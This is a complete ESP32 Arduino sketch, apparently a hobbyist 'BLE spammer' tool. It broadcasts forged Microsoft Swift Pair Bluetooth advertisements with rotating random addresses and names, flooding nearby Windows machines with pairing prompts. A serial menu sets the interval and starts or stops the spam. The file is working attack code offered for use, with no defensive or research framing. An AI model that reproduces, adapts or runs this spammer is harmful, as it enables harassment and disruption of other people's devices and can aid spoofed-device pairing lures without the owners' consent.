/*
 * ESP32-SwiftPair-BLE-Spammer
 * A tool that spams BLE devices on windows machine.
 * Author - WireBits
 */

#include <esp_bt.h>
#include <Arduino.h>
#include <BLEDevice.h>
#include <esp_bt_main.h>
#include <esp_gap_ble_api.h>

#define DEVICE_NAME "ESP32-Microsoft-BLE-Spammer"

static esp_ble_adv_params_t adv_params = {
  .adv_int_min = 160,
  .adv_int_max = 160,
  .adv_type = ADV_TYPE_NONCONN_IND,
  .own_addr_type = BLE_ADDR_TYPE_RANDOM,
  .peer_addr = {0},
  .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
  .channel_map = ADV_CHNL_ALL,
  .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY
};

BLEServer *pServer;

bool spamming = false;
bool randomMode = true;
String customName = "";
uint32_t spamInterval = 1000;

String generate_random_name() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  int len = 20;
  String name = "";
  for (int i = 0; i < len; i++) {
    name += charset[random(0, strlen(charset))];
  }
  return name;
}

uint8_t* build_adv_packet(String name, size_t* out_len) {
  size_t name_len = name.length();
  size_t total_len = 3 + 2 + (2 + 3 + name_len);
  uint8_t* adv = (uint8_t*)malloc(total_len);
  if (!adv) return nullptr;
  size_t i = 0;
  adv[i++] = 0x02;
  adv[i++] = 0x01;
  adv[i++] = 0x06;
  adv[i++] = (2 + 3 + name_len) + 1;
  adv[i++] = 0xFF;
  adv[i++] = 0x06;
  adv[i++] = 0x00;
  adv[i++] = 0x03;
  adv[i++] = 0x00;
  adv[i++] = 0x80;
  memcpy(&adv[i], name.c_str(), name_len);
  i += name_len;
  *out_len = i;
  return adv;
}

void generate_random_static_addr(uint8_t addr[6]) {
  for (int i = 0; i < 6; i++) addr[i] = esp_random() & 0xFF;
  addr[5] = (addr[5] & 0x3F) | 0xC0;
}

void start_advertising_raw(uint8_t* adv, size_t len) {
  esp_ble_gap_config_adv_data_raw(adv, len);
  esp_ble_gap_start_advertising(&adv_params);
}

void stop_advertising_raw() {
  esp_ble_gap_stop_advertising();
}

void printHelp() {
  Serial.println(F("Available commands:"));
  Serial.println(F("  random               - Spam using random name"));
  Serial.println(F("  custom <your_name>   - Spam using custom name"));
  Serial.println(F("  interval <ms>        - Set spam interval (Default : 1000 ms)"));
  Serial.println(F("  start                - Start Spamming"));
  Serial.println(F("  stop                 - Stop Spamming"));
  Serial.println(F("  help                 - Show this help message"));
}

void handleSerial() {
  if (!Serial.available()) return;
  String line = Serial.readStringUntil('\n');
  line.trim();
  String low = line;
  low.toLowerCase();
  if (low == "start") {
    spamming = true;
    Serial.println("[*] Spamming Started!");
  }
  else if (low == "stop") {
    if (!spamming) {
      Serial.println("[!] Start Spamming First!");
      return;
    }
    spamming = false;
    stop_advertising_raw();
    Serial.println("[!] Spamming Stopped!");
  }
  else if (low == "random") {
    randomMode = true;
    Serial.println("[*] Random Mode Activated!");
  }
  else if (low.startsWith("custom")) {
  String val = line.substring(6);
  val.trim();
  int len = val.length();
  if (len < 8) {
    Serial.println("[!] Name too short! Minimum 8 characters required!");
    return;
  }
  if (len > 20) {
    Serial.println("[!] Name too long! Trimming to 20 characters!");
    val = val.substring(0, 20);
  }
  customName = val;
  randomMode = false;
  Serial.print("[*] Custom Name Set To : ");
  Serial.println(customName);
  }
  else if (low.startsWith("interval")) {
    String val = line.substring(8);
    val.trim();
    int newInterval = val.toInt();
    if (newInterval <= 0) {
      Serial.println("[!] Invalid interval. Must be > 0!");
    } else {
      spamInterval = newInterval;
      Serial.print("[*] Interval Set To : ");
      Serial.print(spamInterval);
      Serial.println(" ms!");
    }
  }
  else if (low == "help") {
    printHelp();
  }
}

void setup() {
  Serial.begin(115200);
  BLEDevice::init(DEVICE_NAME);
  pServer = BLEDevice::createServer();
  randomSeed(esp_random());
  Serial.println("Initializing ESP32-SwiftPair-BLE-Spammer...");
  Serial.println("Type 'help' for available commands.");
  printHelp();
}

void loop() {
  handleSerial();
  if (!spamming) {
    delay(50);
    return;
  }
  String name = randomMode ? generate_random_name() : customName;
  uint8_t addr[6];
  generate_random_static_addr(addr);
  esp_ble_gap_set_rand_addr(addr);
  size_t adv_len;
  uint8_t* adv = build_adv_packet(name, &adv_len);
  if (!adv) return;
  Serial.print("Packet : ");
  for (int i = 0; i < adv_len; i++) {
    if (adv[i] < 16) Serial.print("0");
    Serial.print(adv[i], HEX);
    Serial.print(" ");
  }
  Serial.println();
  start_advertising_raw(adv, adv_len);
  delay(spamInterval);
  stop_advertising_raw();
  free(adv);
}